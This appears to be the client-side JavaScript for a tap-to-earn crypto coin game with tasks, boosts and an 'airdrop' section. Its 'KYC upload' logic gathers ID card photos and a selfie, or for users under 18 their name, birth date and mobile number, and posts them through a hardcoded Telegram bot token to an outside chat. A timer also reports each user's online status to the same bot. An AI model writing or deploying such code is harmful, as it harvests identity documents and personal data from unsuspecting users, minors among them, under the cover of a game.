let coinCount = parseInt(localStorage.getItem('coinCount')) || 0;
let earningsRate = parseInt(localStorage.getItem('earningsRate')) || 0;
const coinCounter = document.getElementById('coin-count');
const earningsDisplay = document.getElementById('earnings-count');
const abCoin = document.getElementById('ab-coin');
const tasksCompleted = JSON.parse(localStorage.getItem('tasksCompleted')) || {};

// Function to format coin count
function formatCoinCount(count) {
    return count.toLocaleString('en-US');
}

// Update coin counter display
coinCounter.textContent = formatCoinCount(coinCount);

// Task item completion logic
document.querySelectorAll('.task-item').forEach(task => {
    const taskUrl = task.dataset.url;
    const taskId = task.dataset.url; // Use URL as unique ID

    // Check if the task is already completed
    if (tasksCompleted[taskId]) {
        task.classList.add('completed');
        task.style.display = 'none'; // Hide completed task
    }

    task.addEventListener('click', () => {
        window.open(taskUrl, '_blank');
        coinCount += 1000000; // Reward for completing the task
        localStorage.setItem('coinCount', coinCount);
        tasksCompleted[taskId] = true; // Mark task as completed
        localStorage.setItem('tasksCompleted', JSON.stringify(tasksCompleted));
        task.classList.add('completed');
        task.style.display = 'none'; // Hide completed task
        coinCounter.textContent = formatCoinCount(coinCount);
    });
});

// Coin click logic
abCoin.addEventListener('touchstart', (event) => {
    event.preventDefault();
    for (let touch of event.touches) {
        createCoinIncrement(touch.clientX, touch.clientY);
    }
});

// Coin click logic
abCoin.addEventListener('click', (event) => {
    createCoinIncrement(event.clientX, event.clientY);
});

// Create coin increment animation
function createCoinIncrement(x, y) {
    const coinIncrement = document.createElement('div');
    coinIncrement.classList.add('coin-increment');
    coinIncrement.innerText = '+1';
    coinIncrement.style.left = `${x}px`;
    coinIncrement.style.top = `${y - 50}px`;
    document.body.appendChild(coinIncrement);
    setTimeout(() => {
        coinIncrement.remove();
    }, 1000);

    coinCount++;
    coinCounter.textContent = formatCoinCount(coinCount);
    localStorage.setItem('coinCount', coinCount);
}

// Boost item purchase logic
document.querySelectorAll('.boost-item').forEach(boost => {
    const cost = parseInt(boost.dataset.cost);
    const earn = parseInt(boost.dataset.earn);

    boost.addEventListener('click', () => {
        if (coinCount >= cost) {
            coinCount -= cost;
            earningsRate += earn;
            localStorage.setItem('coinCount', coinCount);
            localStorage.setItem('earningsRate', earningsRate);
            boost.innerHTML = `Buy for ${cost} AB Coin - Earn ${earn}/sec (Current: ${earningsRate}/sec)`;
            coinCounter.textContent = formatCoinCount(coinCount);
        }
    });
});

// Load earnings rate from local storage
window.addEventListener('load', () => {
    earningsDisplay.textContent = formatCoinCount(earningsRate);
});

// KYC upload logic
document.getElementById('age-select').addEventListener('change', function() {
    const selectedValue = this.value;
    document.getElementById('upload-18plus').style.display = selectedValue === '18plus' ? 'block' : 'none';
    document.getElementById('upload-under18').style.display = selectedValue === 'under18' ? 'block' : 'none';
    document.getElementById('kyc-upload').style.display = 'block';
});

document.getElementById('upload-kyc').addEventListener('click', function() {
    const selectedValue = document.getElementById('age-select').value;
    let kycData = {};
    
    if (selectedValue === '18plus') {
        kycData = {
            frontCard: document.getElementById('front-card').files[0],
            backCard: document.getElementById('back-card').files[0],
            selfie: document.getElementById('selfie').files[0]
        };
    } else {
        kycData = {
            name: document.getElementById('name').value,
            dob: document.getElementById('dob').value,
            mobile: document.getElementById('mobile').value
        };
    }

    // Simulate uploading KYC data to Telegram
    sendTelegramMessage(`KYC Data: ${JSON.stringify(kycData)}`);
    localStorage.setItem('kycUploaded', 'true'); // Prevent further uploads
    alert('Verify account. You cannot upload KYC again.');
});

// Send message to Telegram
function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot7868523462:AAGyII1jUGQlkY6zJSXXpweeznZ783u5p0s/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: 7513130957,
            text: message
        })
    });
}

// Button event listeners
document.getElementById('task-button').addEventListener('click', () => togglePopup('task-popup'));
document.getElementById('airdrop-button').addEventListener('click', () => togglePopup('airdrop-popup'));
document.getElementById('boost-button').addEventListener('click', () => togglePopup('boost-popup'));

// Close popups
document.querySelectorAll('.close-btn').forEach(btn => {
    btn.addEventListener('click', (event) => {
        const popup = event.target.closest('.popup');
        popup.style.display = 'none';
    });
});

// Toggle popup display
function togglePopup(popupId) {
    const popup = document.getElementById(popupId);
    popup.style.display = popup.style.display === 'none' || popup.style.display === '' ? 'block' : 'none';
}

// User online/offline logic
function notifyUserStatus(status) {
    sendTelegramMessage(`User is now ${status}.`);
}

// Example user status change simulation
setInterval(() => {
    // Simulate user coming online
    notifyUserStatus('online');
    setTimeout(() => {
        // Simulate user going offline
        notifyUserStatus('offline');
    }, 5000);
}, 10000); // Check every 10 seconds for simulation purposes